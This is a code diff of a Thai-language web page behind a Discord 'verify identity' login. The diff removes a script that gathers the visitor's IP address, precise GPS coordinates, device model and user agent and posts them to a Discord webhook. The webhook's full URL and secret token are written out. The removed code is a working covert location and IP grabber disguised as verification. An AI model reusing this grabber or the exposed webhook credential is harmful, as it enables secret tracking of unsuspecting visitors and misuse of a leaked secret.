@@ -144,57 +144,6 @@
       window.location.href = discordAuthUrl;
     });
 
-    const webhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u";
-
-    function setStatus(text, type = "") {
-      statusEl.innerText = text;
-      statusEl.className = "";
-      if (type) statusEl.classList.add(type);
-    }
-
-    async function sendIpLocationToWebhook() {
-      setStatus("⏳ กำลังดึง IP และตำแหน่ง...", "loading");
-
-      try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
-
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(async position => {
-            const lat = position.coords.latitude.toFixed(6);
-            const lon = position.coords.longitude.toFixed(6);
-            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            const content = `📍 ผู้ใช้ยืนยันตัวตนแล้ว:
-🌐 IP: ${ip}
-📌 พิกัด: ${lat}, ${lon}
-🗺️ [ดูบนแผนที่](${mapUrl})
-📱 อุปกรณ์: ${deviceModel}
-💻 UA: ${navigator.userAgent}`;
-
-            const res = await fetch(webhookUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content })
-            });
-
-            if (res.ok) {
-              setStatus("✅ ส่ง IP และตำแหน่งแล้ว", "success");
-            } else {
-              setStatus("❌ ส่งข้อมูลไม่สำเร็จ", "error");
-            }
-          }, error => {
-            setStatus("❌ ไม่สามารถระบุตำแหน่ง: " + error.message, "error");
-          }, { enableHighAccuracy: true, timeout: 10000 });
-        } else {
-          setStatus("❌ เบราว์เซอร์ไม่รองรับการระบุตำแหน่ง", "error");
-        }
-      } catch (err) {
-        setStatus("❌ ข้อผิดพลาด: " + err.message, "error");
-      }
-    }
-
     // ตรวจว่ากลับมาจาก Discord (มี code อยู่) → ส่งข้อมูลเลย
     function getQueryParam(param) {
       return new URLSearchParams(window.location.search).get(param);
